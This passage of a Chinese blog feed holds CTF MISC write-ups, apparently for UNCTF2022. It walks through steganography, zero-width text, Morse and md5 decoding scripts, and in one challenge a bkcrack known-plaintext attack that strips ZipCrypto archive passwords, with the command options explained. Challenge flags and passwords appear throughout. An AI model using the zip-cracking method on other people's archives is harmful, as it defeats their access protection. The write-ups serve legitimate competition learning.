start="5"><li>使用上一步的密码<code>this_is_pAssw0rd@!</code>解压<code>皮皮特的外套.zip</code>，打开<code>皮皮特.pptx</code>，如下图：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203212750918.png" alt="image-20221203212750918"></p><p>观察了一下，基本就是很多颜色，组合在一起，看别人的WP的操作是，手动记录所有页的颜色，然后根据<code>红橙黄绿青蓝紫</code>的顺序，替换为<code>0~6</code>，然后7进制转10进制，然后转ASCII。</p><p>有点麻烦，我还是使用代码吧。</p><br><ol start="6"><li><code>皮皮特.pptx</code>，修改后缀名后为<code>皮皮特.zip</code>，然后解压文件，将下面代码放到<code>皮皮特\ppt\slides\_rels</code>的文件夹中。</li></ol><p>代码逻辑如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203213223350.png" alt="image-20221203213223350"></p><p>首先我看到了<code>皮皮特\ppt\media</code>里面有8张图片，有<code>红橙黄绿青蓝紫白</code>，我这边定义了一个颜色字典，image1~image8分别代表的颜色。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203213718076.png" alt="image-20221203213718076"></p><p>打开<code>皮皮特\ppt\slides\_rels\slide1.xml.rels</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203213509029.png" alt="image-20221203213509029"></p><p>可以看到<code>../media/image1.png</code>，<code>image1.png</code>的颜色为黄色，我们看ppt的第一页也是黄色，所以这个文件就和ppt看到的颜色是对应关系，所以代码就利用这一点，就可以得到每一页ppt的颜色。</p><p>最后一步就是7进制转10进制，再转ASCII就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">color_dic = &#123;</span><br><span class="line">    <span class="string">&quot;image1&quot;</span>: <span class="string">&quot;黄&quot;</span>, <span class="string">&quot;image2&quot;</span>: <span class="string">&quot;红&quot;</span>, <span class="string">&quot;image3&quot;</span>: <span class="string">&quot;青&quot;</span>, <span class="string">&quot;image4&quot;</span>: <span class="string">&quot;白&quot;</span>, <span class="string">&quot;image5&quot;</span>: <span class="string">&quot;橙&quot;</span>, <span class="string">&quot;image6&quot;</span>: <span class="string">&quot;绿&quot;</span>, <span class="string">&quot;image7&quot;</span>: <span class="string">&quot;紫&quot;</span>, <span class="string">&quot;image8&quot;</span>: <span class="string">&quot;蓝&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">color_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">77</span>):</span><br><span class="line">    file_path = <span class="string">f&quot;./slide<span class="subst">&#123;i&#125;</span>.xml.rels&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    color_str += color_dic[re.findall(<span class="string">&#x27;media/(.*?).png&quot;&#x27;</span>, data)[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">maketran = <span class="built_in">str</span>.maketrans(<span class="string">&quot;红橙黄绿青蓝紫&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)))</span><br><span class="line">lis = color_str.translate(maketran).split(<span class="string">&quot;白&quot;</span>)</span><br><span class="line">lis.pop(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">7</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行截图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203213128302.png" alt="image-20221203213128302"></p><p><strong>flag{10ve_exCe1_!!!}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF2022公开赛-MISC-WriteUp</title>
      <link href="/posts/18747.html"/>
      <url>/posts/18747.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-magic-word-西南科技大学"><a href="#1-magic-word-西南科技大学" class="headerlink" title="1.magic_word-西南科技大学"></a>1.magic_word-西南科技大学</h1><ol><li><code>magic_word.docx</code>后缀改成zip，然后解压，打开<code>\word\document.xml</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117150653246.png"></p><ol start="2"><li><p>复制这一段，必须向上图那样复制，不然末尾一段零宽字符会没复制上</p><p>零宽网站：<code>https://www.mzy0.com/ctftools/zerowidth1/</code></p></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117150803474.png" alt="image-20221117150803474"></p><p><code>unctf&#123;We1come_new_ctfer&#125;</code></p><br><h1 id="2-syslog-浙江师范大学"><a href="#2-syslog-浙江师范大学" class="headerlink" title="2.syslog-浙江师范大学"></a>2.syslog-浙江师范大学</h1><ol><li><p>打开syslog，我搜索了几个关键字，key，password的时候，搜索出现了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151004951.png" alt="image-20221117151004951"></p></li></ol><p><code>cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA==</code> —&gt; base64 —&gt; <code>password is U6nu2_i3_b3St</code></p><ol start="2"><li>用密码解压flag.zip，得到flag：</li></ol><p><code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p><br><h1 id="3-巨鱼-河南理工大学"><a href="#3-巨鱼-河南理工大学" class="headerlink" title="3.巨鱼-河南理工大学"></a>3.巨鱼-河南理工大学</h1><ol><li>打开fish.png，尾部有zip，我是复制然后粘贴出来的（foremost应该也可以）</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151237958.png" alt="image-20221117151237958"></p><ol start="2"><li>我的看图软件(ImageGlass)打不开图片，所以大概率宽高不对，crc32爆破一下。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151448512.png" alt="image-20221117151448512"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151415578.png" alt="image-20221117151415578"></p><ol start="3"><li>打开图片</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151530713.png" alt="image-20221117151530713"></p><ol start="4"><li>用密码<code>无所谓我会出手</code>，解开之前尾部保存的zip文件，得到<code>flag.txt, flagisnothere.zip </code></li></ol><p><strong>flag.txt：</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151746658.png" alt="image-20221117151746658"></p><p>我提交了一下，是不对的。</p><ol start="5"><li>flagisnothere.zip是伪加密的，我用的<code>ZipCenOp</code>解开的。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151901095.png" alt="image-20221117151901095"></p><p><strong>pass.png:</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151916643.png" alt="image-20221117151916643"></p><ol start="6"><li>我用识图工具找了一下是<code>六氯环己烷</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152036164.png" alt="image-20221117152036164"></p><p>别名叫六六六，所以flag.pptx的打开密码就是<code>666</code>（当然也是试了好几次出来的）</p><ol start="7"><li>我们要关闭文档保护，也就是不使用密码</li></ol><p>​<img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152221516.png" alt="image-20221117152221516"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152254739.png" alt="image-20221117152254739"></p><p>上面密码留空，然后确定，文档的密码就没了。</p><ol start="8"><li>修改后缀名为zip，然后解压，用vscode打开，<code>ctrl+shift+f</code>搜索unctf</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152443291.png" alt="image-20221117152443291"></p><p><strong>UNCTF{y0u_F1nd_1t!}</strong></p><br><h1 id="4-找得到我吗-闽南师范大学"><a href="#4-找得到我吗-闽南师范大学" class="headerlink" title="4.找得到我吗-闽南师范大学"></a>4.找得到我吗-闽南师范大学</h1><ol><li><p><code>找得到我吗.docx</code>后缀名改成zip，解压。</p></li><li><p>vscode搜索</p></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152706834.png" alt="image-20221117152706834"></p><p><strong>flag{You_find_me!}</strong></p><br><h1 id="5-社什么社-湖南警察学院"><a href="#5-社什么社-湖南警察学院" class="headerlink" title="5.社什么社-湖南警察学院"></a>5.社什么社-湖南警察学院</h1><ol><li>打开txt，放大缩小，弄到一个合适的情况后</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152938947.png" alt="image-20221117152938947"></p><ol start="2"><li>结合出题人的位置<code>湖南</code>，加上古城。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153024474.png" alt="image-20221117153024474"></p><p>所以就是<code>凤凰古城</code>，然后md5，再大写。</p><p><strong>UNCTF{4F0198127A45F66C07A5B1A2DDA8223C}</strong></p><br><h1 id="6-zhiyin-中国人民公安大学"><a href="#6-zhiyin-中国人民公安大学" class="headerlink" title="6.zhiyin-中国人民公安大学"></a>6.zhiyin-中国人民公安大学</h1><ol><li>解压后发现<code>lanqiu.jpg</code>打不开，那我们就先解决它。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153342912.png" alt="image-20221117153342912"></p><p>010editor打开一看就是reverse了，所以我们reverse一下就能回去，这个太简单了，我没写代码，你们不会的百度找个代码吧，我用的是自己的集合的那种脚本。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153509139.png" alt="image-20221117153509139"></p><p>得到关键字：<code>Go_p1ay</code>（注意是1不是l，我就被这个卡半天了）</p><ol start="2"><li>010editor打开<code>zhiyin.png</code>，尾部明显的morse密码。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153635833.png" alt="image-20221117153635833"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153725184.png" alt="image-20221117153725184"></p><p>使用CyberChef，链接：<a href="https://ctf.mzy0.com/CyberChef3/">https://ctf.mzy0.com/CyberChef3/</a></p><p>得到关键字：<code>_UNC7F!!!</code> —&gt; 小写 —&gt; <code>_unc7f!!!</code>（我就因为没有小写，然后解压不开flag.zip，卡了半天）</p><p>所以正确的密码是：<code>Go_p1ay_unc7f!!!</code></p><ol start="3"><li>解压flag.zip，得到flag：</li></ol><p><strong>flag{M1sic_1s_greAt}</strong></p><br><h1 id="7-清和fan-江西警察学院"><a href="#7-清和fan-江西警察学院" class="headerlink" title="7.清和fan-江西警察学院"></a>7.清和fan-江西警察学院</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154114774.png" alt="image-20221117154114774"></p><p>去哔哩哔哩搜索清和，第一个就是，它的内容刚刚好和手办有关系。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154206458.png" alt="image-20221117154206458"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_21-49-46.png" alt="Snipaste_2022-11-16_21-49-46"></p><p>所以解压密码为：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/passwd.png" alt="passwd"></p><ol><li><code>MKM.png</code>有lsb隐写，所以解压密码为：<code>qq857488580</code>，解压<code>阿和的真实竟然身份是？.zip</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_21-42-04.png" alt="Snipaste_2022-11-16_21-42-04"></p><ol start="2"><li><code>神秘电波.wav</code>，打开一听就是rot36，再加上36s我更加确定，我使用的是<code>MMSSTV</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_21-45-05.png" alt="Snipaste_2022-11-16_21-45-05"></p><p>又得到关键字：<code>V@mpir3</code>，解压<code>flag.zip</code></p><ol start="3"><li>打开<code>flag.txt</code>，这一看就是有零宽。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154621741.png" alt="image-20221117154621741"></p><ol start="4"><li>零宽网站：<a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154726386.png" alt="image-20221117154726386"></p><p><strong>unctf{wha1e_wants_a_girlfriend_like_alicia}</strong></p><br><h1 id="8-芝麻开门-广东海洋大学"><a href="#8-芝麻开门-广东海洋大学" class="headerlink" title="8.芝麻开门-广东海洋大学"></a>8.芝麻开门-广东海洋大学</h1><ol><li>打开<code>key.txt</code>，找到最下面的<code>a2V5MQ==</code> —&gt; base64 —&gt; <code>key1</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154850468.png" alt="image-20221117154850468"></p><ol start="2"><li>在StegSolve观察了一下，明显有lsb，再加上给了密码，所以使用<code>cloacked-pixel</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_17-54-28.jpg" alt="Snipaste_2022-11-16_17-54-28"></p><ol start="3"><li>打开<code>out</code>就是看到flag了</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155158627.png" alt="image-20221117155158627"></p><p><strong>flag{faf5bdd5-ba3d-11da-ad31-d33d75182f1b}</strong></p><p>然后改一下格式：</p><p><strong>UNCTF{faf5bdd5-ba3d-11da-ad31-d33d75182f1b}</strong></p><br><h1 id="9-In-the-Morse-Garden-陆军工程大学"><a href="#9-In-the-Morse-Garden-陆军工程大学" class="headerlink" title="9.In_the_Morse_Garden-陆军工程大学"></a>9.In_the_Morse_Garden-陆军工程大学</h1><ol><li>打开<code>In_the_Morse_Garden.pdf</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155312556.png" alt="image-20221117155312556"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm +WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5 46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k 5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm +WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y 2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3 lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54 6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y +k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T ljaE=&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>base64解码</li></ol><p><img src="/image-20221117155408567.png" alt="image-20221117155408567"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依古比古玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡依古比古依古比古依古比古 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡依古比古玛卡巴卡玛卡巴卡</span><br></pre></td></tr></table></figure><p>根据题目的Morse的提示，所以这是摩斯密码。</p><p>摩斯密码在线网站：<code>http://www.all-tool.cn/Tools/morse/</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155548456.png" alt="image-20221117155548456"></p><p><strong>UNCTF{WAN_AN_MAKA_BAKAAAAA!}</strong></p><br><h1 id="10-我小心海也绝非鳝类-中国计量大学现代科技学院"><a href="#10-我小心海也绝非鳝类-中国计量大学现代科技学院" class="headerlink" title="10.我小心海也绝非鳝类-中国计量大学现代科技学院"></a>10.我小心海也绝非鳝类-中国计量大学现代科技学院</h1><ol><li>010editor打开<code>我小心海也绝非鳝类.png</code>，发现尾部base64字符串。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155717510.png" alt="image-20221117155717510"></p><p><code>RUFTWUxTQg==</code> —&gt; base64 —&gt; <code>EASYLSB</code>，得到关键信息：<code>EASYLSB</code></p><p>2. </p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155847551.png" alt="image-20221117155847551"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_10-17-49.png" alt="Snipaste_2022-11-17_10-17-49"></p><p>得到关键信息：<code>flaginmd5</code></p><ol start="3"><li>使用<code>cloacked-pixel</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_11-00-47.png" alt="Snipaste_2022-11-17_11-00-47"></p><ol start="4"><li>得到out</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF</span><br></pre></td></tr></table></figure><ol start="5"><li>根据提示md5，md5的话是32位</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160036720.png" alt="image-20221117160036720"></p><p>out的文本内容能被32整除，所以大概率就是32位md5代表一个字符，和本次比赛的Crypto方向的md5-1，基本一模一样。写个python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.create dic</span></span><br><span class="line">dic = &#123;hashlib.md5(i.encode()).hexdigest().upper(): i <span class="keyword">for</span> i <span class="keyword">in</span> string.printable&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(dic.get(data[i:i+<span class="number">32</span>]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160238887.png" alt="image-20221117160238887"></p><p><strong>flag{welcome_to_misc}</strong></p><p>改一下格式：</p><p><strong>UNCTF{welcome_to_misc}</strong></p><br><h1 id="11-剥茧抽丝-内蒙古警察职业学院"><a href="#11-剥茧抽丝-内蒙古警察职业学院" class="headerlink" title="11.剥茧抽丝-内蒙古警察职业学院"></a>11.剥茧抽丝-内蒙古警察职业学院</h1><p>这题我的wp应该是非常规解法，为什么是非常规，这个锅必须<code>sublime text</code>背！！！</p><ol><li><code>1.txt</code>可以看到是有零宽的</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160525155.png" alt="image-20221117160525155"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160629122.png" alt="image-20221117160629122"></p><p>很明显，我得到了乱码，所以这个地方我开始就没做出来。</p><ol start="2"><li>我先来说出题人的正确想法：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160741481.png" alt="image-20221117160741481"></p><p><code>2.txt</code>的crc32是<code>1E153DBB</code>，原本的<code>1.txt</code>的crc32是<code>5CE71FFF</code>，所以这两个内容肯定不相同，所以不能明文攻击。</p><p>但是，你只要自己新建一个文件，然后写上<code>线索就在眼前，你能利用并找到flag吗</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161038999.png" alt="image-20221117161038999"></p><p>现在crc32和文件里面的crc32一样了，现在可以用压缩攻击压缩然后明文攻击了。</p><ol start="3"><li>说完出题人，现在说我的解法：</li></ol><p>我为什么没有人出题人的解法呢？因为<code>sublime text</code></p><p>首先，我复制了<code>1.txt</code>的内容到了<code>1 - 副本.txt</code>，然后我把能看见的零宽字符删掉了，也就下图这样：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161320454.png" alt="image-20221117161320454"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161348518.png" alt="image-20221117161348518"></p><p>crc32显示<code>c5c55f26</code>，所以我就没办法明文攻击了。</p><p>可能有人就好奇了，为什么你把零宽都删掉了，怎么crc32不一样啊，有没有一种可能，我根本就没把零宽字符删干净，我们把<code>1 - 副本.txt</code>复制到kali里面去。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161559557.png" alt="image-20221117161559557"></p><p>使用vim打开，你会发现还有一堆的零宽字符，所以说我们根本没有删干净，但是sublime text上面并没有显示零宽字符了！</p><p>所以我就没办法明文攻击，但是虽然不能攻击2.txt，但是我们可以攻击flag.zip。</p><p>为什么可以攻击flag.zip，这是因flag.zip的算法为<code>ZipCrypto Store</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161803584.png" alt="image-20221117161803584"></p><ol start="4"><li>实现攻击的仓库是用的<code>https://github.com/kimci86/bkcrack</code>，不太会的可以看我之前的一个<a href="https://www.bilibili.com/video/BV1iG411A7yJ/?spm_id_from=333.999.0.0&vd_source=60cf53bc00c2d4afa9b53e5b9232bdd2">视频教程，戳我打开</a>。</li></ol><p>首先我构造了一个zip的文件尾部，但是我当时也没有把握能攻击出来，因为压缩文件如果有注释的话，那我百分比攻击不出来，有注释的话偏移就变了。（也就是以前在这个位置上，现在不在这个位置了）</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162006342.png" alt="image-20221117162006342"></p><p>攻击命令如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_19-21-42.jpg" alt="Snipaste_2022-11-16_19-21-42"></p><p><code>-o 239</code>是根据<code>flag.zip的大小 - 22字节</code>得到的。</p><p><code>-x 0 504B03041400</code>这个是zip的文件头部。</p><p>可以看到成功得到了12字节的key。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_19-32-51.jpg" alt="Snipaste_2022-11-16_19-32-51"></p><p>修改压缩包的密码为<code>easy</code></p><ol start="5"><li>使用密码<code>easy</code>去解压，得到一个新的<code>flag.zip</code>，这里面就是flag了，但是需要密码</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162452092.png" alt="image-20221117162452092"></p><p>这个压缩包的密码就在一开始零宽里面。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162541393.png" alt="image-20221117162541393"></p><p>然后我们下载解密后的隐藏数据，使用sublime text打开</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162623441.png" alt="image-20221117162623441"></p><p>密码：<code>PAsS_w0rD</code></p><p>这个地方花了我很久时间，因为我是真的忘记了还可以隐藏二进制数据，因为上面的文本一直得不到有意义的文字，我滑动到了下面的窗口，然后我试了一下，果然是二进制数据。</p><p>解压<code>新的flag.zip</code>，得到flag：</p><p><strong>unctf{d4a3a242-cd32-4dd5-bac6-84bdf13f527f}</strong></p><p>改一下格式：</p><p><strong>UNCTF{d4a3a242-cd32-4dd5-bac6-84bdf13f527f}</strong></p><br><h1 id="12-MY-PICTURE-信阳师范"><a href="#12-MY-PICTURE-信阳师范" class="headerlink" title="12.MY PICTURE-信阳师范"></a>12.MY PICTURE-信阳师范</h1><ol><li><p><code>Picture</code>添加后缀zip，解压，得到两个文件：<code>dat</code> 和 <code>flag.png</code></p></li><li><p><code>dat</code>用010editor打开乱码，所以我就用我的脚本试了一下，也就是检测文件头和文件尾的，出来了异或<code>0x8e</code></p></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_17-57-23.jpg" 